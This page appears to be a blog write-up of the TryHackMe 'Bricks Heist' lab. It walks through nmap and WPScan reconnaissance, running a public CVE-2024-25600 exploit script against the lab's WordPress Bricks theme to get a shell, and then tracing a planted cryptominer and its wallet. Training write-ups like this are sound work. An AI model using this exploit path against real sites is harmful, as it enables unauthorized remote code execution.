@@ -1,0 +1,394 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <meta charset="utf-8">
+        <meta http-equiv="X-UA-Compatible" content="IE=edge">
+        <title>TryHack3M: Bricks Heist &middot; </title>
+        <meta name="description" content="Writeup for TryHackMe 3 Million Users Challenge.">
+        <meta name="HandheldFriendly" content="True">
+        <meta name="MobileOptimized" content="320">
+        <meta name="generator" content="Hugo 0.148.2">
+        <meta name="robots" content="index,follow">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        
+        <link rel="stylesheet" href="https://r4p3cks.github.io/dist/site.css">
+        <link rel="stylesheet" href="https://r4p3cks.github.io/dist/syntax.css">
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,400,600,700,300&subset=latin,cyrillic-ext,latin-ext,cyrillic">
+        <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" integrity="sha384-wvfXpqpZZVQGK6TAh5PVlGOfQNHSoD2xbE+QkPxCAFlNEevoEH3Sl0sibVcOQVnN" crossorigin="anonymous">
+        
+        
+        
+        
+        
+
+    </head>
+    <body>
+        
+        
+
+        <div id="wrapper">
+            <header class="site-header">
+                <div class="container">
+                    <div class="site-title-wrapper">
+                        
+                            <h1 class="site-title">
+                                <a href="https://r4p3cks.github.io/">R4p3cks Blog</a>
+                            </h1>
+                        
+                        
+                        
+                        
+                        
+                        
+                            <a class="button-square button-social hint--top" data-hint="Github" aria-label="Github" href="https://github.com/R4p3cks" rel="me">
+                                <i class="fa fa-github-alt" aria-hidden="true"></i>
+                            </a>
+                        
+                        
+                        
+                        
+                    </div>
+
+                    <ul class="site-nav">
+                        
+
+                    </ul>
+                </div>
+            </header>
+
+            <div id="container">
+
+
+<div class="container">
+    <article class="post-container" itemscope="" itemtype="http://schema.org/BlogPosting">
+        <header class="post-header">
+    <h1 class="post-title" itemprop="name headline">TryHack3M: Bricks Heist</h1>
+    
+        <p class="post-description" itemprop="description">Writeup for TryHackMe 3 Million Users Challenge.</p>
+    
+    <p class="post-date post-line">
+        <span>Published <time datetime="2025-08-21" itemprop="datePublished">Thu, Aug 21, 2025</time></span>
+        <span>by</span>
+        <span itemscope="" itemprop="author" itemtype="https://schema.org/Person">
+            <span itemprop="name">
+                <a href="#" itemprop="url" rel="author">Reber</a>
+            </span>
+        </span>
+    </p>
+    
+</header>
+
+        <div class="post-content clearfix" itemprop="articleBody">
+    
+
+    <p><img src="/images/R4p3cks.png" alt="R4p3cks"></p>
+<h2 id="table-of-contents">Table of Contents</h2>
+<ul>
+<li><a href="#table-of-contents">Table of Contents</a>
+<ul>
+<li><a href="#challenge-description">Challenge Description</a></li>
+<li><a href="#challenge-walkthrough">Challenge Walkthrough</a>
+<ul>
+<li><a href="#initial-reconnaissance">Initial Reconnaissance</a></li>
+<li><a href="#web-application-analysis">Web Application Analysis</a></li>
+<li><a href="#vulnerability-search">Vulnerability Search</a></li>
+<li><a href="#post-exploitation">Post-Exploitation</a></li>
+</ul>
+</li>
+<li><a href="#decoding-and-blockchain-osint">Decoding and Blockchain OSINT</a></li>
+</ul>
+</li>
+</ul>
+<h3 id="challenge-description">Challenge Description</h3>
+<p>From Three Million Bricks to Three Million Transactions!</p>
+<p>Brick Press Media Co. was working on creating a brand-new web theme that represents a renowned wall using three million byte bricks. Agent Murphy comes with a streak of bad luck. And here we go again: the server is compromised, and they&rsquo;ve lost access.</p>
+<p>Can you hack back the server and identify what happened there?</p>
+<p>Note: Add <code>MACHINE_IP bricks.thm</code> to your /etc/hosts file.</p>
+<p>Answer the questions below:</p>
+<ul>
+<li>
+<p>What is the content of the hidden.txt file in the web folder?</p>
+</li>
+<li>
+<p>What is the name of the suspicious process?</p>
+</li>
+<li>
+<p>What is the service name affiliated with the suspicious process?</p>
+</li>
+<li>
+<p>What is the log file name of the miner instance?</p>
+</li>
+<li>
+<p>What is the wallet address of the miner instance?</p>
+</li>
+<li>
+<p>The wallet address used has been involved in transactions between wallets belonging to which threat group?</p>
+</li>
+</ul>
+<h3 id="challenge-walkthrough">Challenge Walkthrough</h3>
+<h4 id="initial-reconnaissance">Initial Reconnaissance</h4>
+<p>Started by adding the provided domain to my <code>/etc/hosts</code> file:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>    sudo nano /etc/hosts
+</span></span></code></pre></div><p>Then I scanned the target with Nmap to identify open ports and services:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>        nmap -sSVC -p- bricks.thm
+</span></span></code></pre></div><p>The scan revealed the following:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>    PORT     STATE SERVICE  VERSION
+</span></span><span style="display:flex;"><span>    22/tcp   open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>    | ssh-hostkey: 
+</span></span><span style="display:flex;"><span>    |   <span style="color:#ae81ff">3072</span> 2e:ad:5b:0a:49:6e:8f:bb:ae:71:76:60:1d:23:81:a0 <span style="color:#f92672">(</span>RSA<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>    |   <span style="color:#ae81ff">256</span> ce:ff:0f:fd:10:e0:bc:5d:7b:cb:2e:1f:6d:55:11:7c <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>    |_  <span style="color:#ae81ff">256</span> 4a:76:09:40:fb:a6:5a:66:ef:49:c4:1c:3f:4d:bf:ee <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>    80/tcp   open  http     Python http.server 3.5 - 3.10
+</span></span><span style="display:flex;"><span>    |_http-title: Error response
+</span></span><span style="display:flex;"><span>    |http-server-header: WebSockify Python/3.8.10
+</span></span><span style="display:flex;"><span>    443/tcp  open  ssl/http Apache httpd
+</span></span><span style="display:flex;"><span>    | http-methods: 
+</span></span><span style="display:flex;"><span>    |  Supported Methods: GET HEAD POST OPTIONS
+</span></span><span style="display:flex;"><span>    | http-robots.txt: <span style="color:#ae81ff">1</span> disallowed entry 
+</span></span><span style="display:flex;"><span>    |_/wp-admin/
+</span></span><span style="display:flex;"><span>    |_http-favicon: Unknown favicon MD5: 000BF649CC8F6BF27CFB04D1BCDCD3C7
+</span></span><span style="display:flex;"><span>    | ssl-cert: Subject: organizationName<span style="color:#f92672">=</span>Internet Widgits Pty Ltd/stateOrProvinceName<span style="color:#f92672">=</span>Some-State/countryName<span style="color:#f92672">=</span>US
+</span></span><span style="display:flex;"><span>    | Issuer: organizationName<span style="color:#f92672">=</span>Internet Widgits Pty Ltd/stateOrProvinceName<span style="color:#f92672">=</span>Some-State/countryName<span style="color:#f92672">=</span>US
+</span></span><span style="display:flex;"><span>    | Public Key type: rsa
+</span></span><span style="display:flex;"><span>    | Public Key bits: <span style="color:#ae81ff">2048</span>
+</span></span><span style="display:flex;"><span>    | Signature Algorithm: sha256WithRSAEncryption
+</span></span><span style="display:flex;"><span>    | Not valid before: 2024-04-02T11:59:14
+</span></span><span style="display:flex;"><span>    | Not valid after:  2025-04-02T11:59:14
+</span></span><span style="display:flex;"><span>    | MD5:   f1df:99bc:d5ab:5a5a:5709:5099:4add:a385
+</span></span><span style="display:flex;"><span>    |_SHA-1: 1f26:54bb:e2c5:b4a1:1f62:5ea0:af00:0261:35da:23c3
+</span></span><span style="display:flex;"><span>    |_http-generator: WordPress 6.5
+</span></span><span style="display:flex;"><span>    |_http-server-header: Apache
+</span></span><span style="display:flex;"><span>    |ssl-date: TLS randomness does not represent time
+</span></span><span style="display:flex;"><span>    | tls-alpn: 
+</span></span><span style="display:flex;"><span>    |   h2
+</span></span><span style="display:flex;"><span>    |  http/1.1
+</span></span><span style="display:flex;"><span>    |_http-title: Brick by Brick
+</span></span><span style="display:flex;"><span>    3306/tcp open  mysql    MySQL <span style="color:#f92672">(</span>unauthorized<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</span></span></code></pre></div><p>The scan revealed an HTTP server on port 80 and a HTTPS server on port 443, both serving a WordPress site. Port 3306 indicated a MySQL service.</p>
+<h4 id="web-application-analysis">Web Application Analysis</h4>
+<p>Accessing the site at <a href="https://bricks.thm">&lsquo;https://bricks.thm&rsquo;</a> revealed a WordPress site titled &ldquo;Brick by Brick&rdquo;. The next step was to run WPScan to gather more information about the WordPress installation:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>    wpscan --url https://bricks.thm --disable-tls-checks
+</span></span></code></pre></div><p>The scan provided the following information:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>   _______________________________________________________________
+</span></span><span style="display:flex;"><span>             __          _______   _____
+</span></span><span style="display:flex;"><span>             <span style="color:#ae81ff">\ \ </span>       / /  __ <span style="color:#ae81ff">\ </span>/ ____|
+</span></span><span style="display:flex;"><span>              <span style="color:#ae81ff">\ \ </span> /<span style="color:#ae81ff">\ </span> / /| |__<span style="color:#f92672">)</span> | <span style="color:#f92672">(</span>___   ___  __ _ _ __ Â®
+</span></span><span style="display:flex;"><span>               <span style="color:#ae81ff">\ \/</span>  <span style="color:#ae81ff">\/</span> / |  ___/ <span style="color:#ae81ff">\_</span>__ <span style="color:#ae81ff">\ </span>/ __|/ _<span style="color:#e6db74">`</span> | <span style="color:#e6db74">&#39;_ \
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                \  /\  /  | |     ____) | (__| (_| | | | |
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                 \/  \/   |_|    |_____/ \___|\__,_|_| |_|
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">             WordPress Security Scanner by the WPScan Team
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                             Version 3.8.28
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">           Sponsored by Automattic - https://automattic.com/
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">           @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    _______________________________________________________________
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    [+] URL: https://bricks.thm/ [10.10.138.198]
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    [+] Started: Thu Aug 21 13:24:02 2025
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    Interesting Finding(s):
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    [+] Headers
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">     | Interesting Entry: server: Apache
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">     | Found By: Headers (Passive Detection)
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">     | Confidence: 100%
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    [+] robots.txt found: https://bricks.thm/robots.txt
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">     | Interesting Entries:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">     |  - /wp-admin/
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">     |  - /wp-admin/admin-ajax.php
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">     | Found By: Robots Txt (Aggressive Detection)
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">     | Confidence: 100%
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    [+] XML-RPC seems to be enabled: https://bricks.thm/xmlrpc.php
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">     | Found By: Direct Access (Aggressive Detection)
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">     | Confidence: 100%
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">     | References:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">     |  - http://codex.wordpress.org/XML-RPC_Pingback_API
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">     |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">     |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">     |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">     |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    [+] WordPress readme found: https://bricks.thm/readme.html
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">     | Found By: Direct Access (Aggressive Detection)
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">     | Confidence: 100%
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    [+] The external WP-Cron seems to be enabled: https://bricks.thm/wp-cron.php
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">     | Found By: Direct Access (Aggressive Detection)
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">     | Confidence: 60%
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">     | References:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">     |  - https://www.iplocation.net/defend-wordpress-from-ddos
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">     |  - https://github.com/wpscanteam/wpscan/issues/1299
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    [+] WordPress version 6.5 identified (Insecure, released on 2024-04-02).
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">     | Found By: Rss Generator (Passive Detection)
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">     |  - https://bricks.thm/feed/, &lt;generator&gt;https://wordpress.org/?v=6.5&lt;/generator&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">     |  - https://bricks.thm/comments/feed/, &lt;generator&gt;https://wordpress.org/?v=6.5&lt;/generator&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    [+] WordPress theme in use: bricks
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">     | Location: https://bricks.thm/wp-content/themes/bricks/
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">     | Readme: https://bricks.thm/wp-content/themes/bricks/readme.txt
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">     | Style URL: https://bricks.thm/wp-content/themes/bricks/style.css
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">     | Style Name: Bricks
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">     | Style URI: https://bricksbuilder.io/
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">     | Description: Visual website builder for WordPress....
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">     | Author: Bricks
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">     | Author URI: https://bricksbuilder.io/
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">     |
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">     | Found By: Urls In Homepage (Passive Detection)
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">     | Confirmed By: Urls In 404 Page (Passive Detection)
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">     |
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">     | Version: 1.9.5 (80% confidence)
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">     | Found By: Style (Passive Detection)
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">     |  - https://bricks.thm/wp-content/themes/bricks/style.css, Match: &#39;</span>Version: 1.9.5<span style="color:#960050;background-color:#1e0010">&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Enumerating All Plugins <span style="color:#f92672">(</span>via Passive Methods<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">[</span>i<span style="color:#f92672">]</span> No plugins Found.
+</span></span></code></pre></div><p>The scan indicated that the WordPress version was 6.5 and the theme in use was &ldquo;Bricks&rdquo; (v1.9.5). No plugins or config backups were detected. Since the challenge name referenced &ldquo;bricks&rdquo;, I searched for vulnerabilities related to the bricks theme.</p>
+<h4 id="vulnerability-search">Vulnerability Search</h4>
+<p>Searching: <code>Wordpress bricks theme 1.9.5 version exploit</code> led me to a <a href="https://github.com/K3ysTr0K3R/CVE-2024-25600-EXPLOIT">Github repository</a> with an exploit for CVE-2024-25600, and included version 1.9.5 but after executing the exploit i got:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>    python3 CVE-2024-25600.py -u https://bricks.thm/
+</span></span><span style="display:flex;"><span>    ~/Downloads/CVE-2024-25600.py:20: SyntaxWarning: invalid escape sequence <span style="color:#e6db74">&#39;\ &#39;</span>
+</span></span><span style="display:flex;"><span>      / / |  / / /   | <span style="color:#ae81ff">\ </span>/  _ / // /      | <span style="color:#ae81ff">\ </span>/ __/ __//  /  <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>    Traceback <span style="color:#f92672">(</span>most recent call last<span style="color:#f92672">)</span>:
+</span></span><span style="display:flex;"><span>      File <span style="color:#e6db74">&#34;~/Downloads/CVE-2024-25600.py&#34;</span>, line 13, in &lt;module&gt;
+</span></span><span style="display:flex;"><span>        from alive_progress import alive_bar
+</span></span><span style="display:flex;"><span>    ModuleNotFoundError: No module named <span style="color:#e6db74">&#39;alive_progress&#39;</span>
+</span></span></code></pre></div><p>Errors&hellip;. So i had to find another repository that contained the necessary pip packages to run the exploit. After some searching, I found what i was looking for: A <a href="https://github.com/Tornad0007/CVE-2024-25600-Bricks-Builder-plugin-for-WordPress">GitHub repository</a> that contained the exploit.py and the requirements.txt. So i cloned the repository and after running the exploit:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>    python3 exploit.py -u https://bricks.thm/
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Nonce found: 36f00ad481
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> https://bricks.thm/ is vulnerable to CVE-2024-25600, apache
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Shell is ready, please type your commands UwU
+</span></span><span style="display:flex;"><span>    ls
+</span></span><span style="display:flex;"><span>    650c844110baced87e1606453b93f22a.txt
+</span></span><span style="display:flex;"><span>    index.php
+</span></span><span style="display:flex;"><span>    kod
+</span></span><span style="display:flex;"><span>    license.txt
+</span></span><span style="display:flex;"><span>    phpmyadmin
+</span></span><span style="display:flex;"><span>    readme.html
+</span></span><span style="display:flex;"><span>    wp-activate.php
+</span></span><span style="display:flex;"><span>    wp-admin
+</span></span><span style="display:flex;"><span>    wp-blog-header.php
+</span></span><span style="display:flex;"><span>    wp-comments-post.php
+</span></span><span style="display:flex;"><span>    wp-config-sample.php
+</span></span><span style="display:flex;"><span>    wp-config.php
+</span></span><span style="display:flex;"><span>    wp-content
+</span></span><span style="display:flex;"><span>    wp-cron.php
+</span></span><span style="display:flex;"><span>    wp-includes
+</span></span><span style="display:flex;"><span>    wp-links-opml.php
+</span></span><span style="display:flex;"><span>    wp-load.php
+</span></span><span style="display:flex;"><span>    wp-login.php
+</span></span><span style="display:flex;"><span>    wp-mail.php
+</span></span><span style="display:flex;"><span>    wp-settings.php
+</span></span><span style="display:flex;"><span>    wp-signup.php
+</span></span><span style="display:flex;"><span>    wp-trackback.php
+</span></span><span style="display:flex;"><span>    xmlrpc.php 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    cat 650c844110baced87e1606453b93f22a.txt
+</span></span><span style="display:flex;"><span>    THM<span style="color:#f92672">{</span>redacted<span style="color:#f92672">}</span>
+</span></span></code></pre></div><p>First Flag found :D</p>
+<h4 id="post-exploitation">Post-Exploitation</h4>
+<p>Focusing on the second question: &ldquo;What is the name of the suspicious process?&rdquo;. I ran the command to display active system services:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>    systemctl | grep running
+</span></span></code></pre></div><p>Output:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>     acpid.path                                       loaded active     running   ACPI Events Check                                                            
+</span></span><span style="display:flex;"><span>      init.scope                                       loaded active     running   System and Service Manager                                                 
+</span></span><span style="display:flex;"><span>      .....
+</span></span><span style="display:flex;"><span>      systemd-udevd.service                            loaded active     running   udev Kernel Device Manager                                                   
+</span></span><span style="display:flex;"><span>      redacted.service                                   loaded active     running   TRYHACK3M                                               
+</span></span><span style="display:flex;"><span>      ....
+</span></span></code></pre></div><p>+publishFuture = true
+Now i can answer to the third question: The service name affiliated with the suspicious process is:</p>
+<blockquote>
+<p>redacted.service</p></blockquote>
+<p>To check more details about the suspicious service:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>    systemctl status redacted.service
+</span></span><span style="display:flex;"><span>    redacted.service - TRYHACK3M
+</span></span><span style="display:flex;"><span>         Loaded: loaded <span style="color:#f92672">(</span>/etc/systemd/system/redacted.service; enabled; vendor preset: enabled<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>         Active: active <span style="color:#f92672">(</span>running<span style="color:#f92672">)</span> since Thu 2025-08-21 18:51:13 UTC; 4min 8s ago
+</span></span><span style="display:flex;"><span>       Main PID: <span style="color:#ae81ff">2841</span> <span style="color:#f92672">(</span>redacted-process<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>          Tasks: <span style="color:#ae81ff">2</span> <span style="color:#f92672">(</span>limit: 4671<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>         Memory: 31.3M
+</span></span><span style="display:flex;"><span>         CGroup: /system.slice/redacted.service
+</span></span><span style="display:flex;"><span>                 ├─2841 /lib/NetworkManager/redacted-process
+</span></span><span style="display:flex;"><span>                 └─2842 /lib/NetworkManager/redacted-process
+</span></span></code></pre></div><p>From that output, I can answer the second question: The suspicious process is:</p>
+<blockquote>
+<p>redacted-process</p></blockquote>
+<p>I changed the directory <code>cd /lib/NetworkManager/redacted-process</code>, downloaded the binary to my machine to try and analyse it to confirm it was a cryptominer.
+<img src="/tryhack3m-bricks-heist/miner.png" alt="Virus Total Screenshot"></p>
+<p>In the same directory I found <code>redacted.conf</code> (answer to the &ldquo;What is the log file name of the miner instance?&rdquo;). Doing <code>cat redacted.conf</code> reveals the following configuration:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>    cat redacted.conf
+</span></span><span style="display:flex;"><span>    ID: 5757..8526a4a6..6c525054303d
+</span></span><span style="display:flex;"><span>    2024-04-08 10:46:04,743 <span style="color:#f92672">[]</span> confbak: Ready!
+</span></span><span style="display:flex;"><span>    2024-04-08 10:46:04,743 <span style="color:#f92672">[]</span> Status: Mining!
+</span></span><span style="display:flex;"><span>    2024-04-08 10:46:08,745 <span style="color:#f92672">[]</span> Miner<span style="color:#f92672">()</span>
+</span></span><span style="display:flex;"><span>    2024-04-08 10:46:08,745 <span style="color:#f92672">[]</span> Bitcoin Miner Thread Started
+</span></span><span style="display:flex;"><span>    2024-04-08 10:46:08,745 <span style="color:#f92672">[]</span> Status: Mining!
+</span></span><span style="display:flex;"><span>    2024-04-08 10:46:10,747 <span style="color:#f92672">[]</span> Miner<span style="color:#f92672">()</span>
+</span></span><span style="display:flex;"><span>    2024-04-08 10:46:12,748 <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Miner<span style="color:#f92672">()</span>
+</span></span></code></pre></div><h3 id="decoding-and-blockchain-osint">Decoding and Blockchain OSINT</h3>
+<p>I noticed the ID looks Hexadecimal, so I convert it to ASCII using my good old reliable friend <a href="https://cyberchef.org/">CyberChef</a>:</p>
+<blockquote>
+<p><code>WW1NeGN..lRPT0=</code></p></blockquote>
+<p>Now it&rsquo;s base64, so using the operation <code>from base64</code> &hellip;another base64 :P</p>
+<blockquote>
+<p>&lsquo;YmMx..2dDRsNjdxYQ==&rsquo;</p></blockquote>
+<p>Using again the same operation:</p>
+<blockquote>
+<p>bc1qyk..ptl4l7qabc1&hellip;ptl8avt4l7qa</p></blockquote>
+<p>I checked the questions again and it&rsquo;s about a wallet address so after analyzing the string i find the start <code>bc1</code> it&rsquo;s repeting in the middle. The answer to the second-to-last question is right there.</p>
+<p>Now to answer the last question (threat group), I inspected the blockchain ledger for transactions related to this wallet. I found several transactions linking this wallet to other addresses. Searching for the others envolved addresses i find:
+<img src="/tryhack3m-bricks-heist/final_flag.png" alt="final_flag"></p>
+
+</div>
+
+        <footer class="post-footer clearfix">
+        <p class="post-tags">
+            <span>Tagged:</span>
+                <a href="/tags/ctf/">ctf</a>, 
+                <a href="/tags/osint/">osint</a>, 
+                <a href="/tags/cryptography/">cryptography</a>, 
+                <a href="/tags/forensics/">forensics</a>, 
+                <a href="/tags/wordpress/">wordpress</a>, 
+                <a href="/tags/easy/">easy</a>, 
+                <a href="/tags/tryhackme/">tryhackme</a>
+        </p>
+    <div class="share">
+    </div>
+</footer>
+
+        
+    </article>
+</div>
+
+</div>
+        </div>
+
+        <footer class="footer">
+            <div class="container">
+                <div class="site-title-wrapper">
+                    <h1 class="site-title">
+                        <a href="https://r4p3cks.github.io/">R4p3cks Blog</a>
+                    </h1>
+                    <a class="button-square button-jump-top js-jump-top" href="#" aria-label="Back to Top">
+                        <i class="fa fa-angle-up" aria-hidden="true"></i>
+                    </a>
+                </div>
+
+                
+                <p class="footer-copyright">
+                    <span>&copy; 2025 / Powered by <a href="https://gohugo.io/">Hugo</a></span>
+                </p>
+            </div>
+        </footer>
+
+        <script src="https://r4p3cks.github.io/js/jquery-1.11.3.min.js"></script>
+        <script src="https://r4p3cks.github.io/js/jquery.fitvids.js"></script>
+        <script src="https://r4p3cks.github.io/js/scripts.js"></script>
+        
+    </body>
+</html>
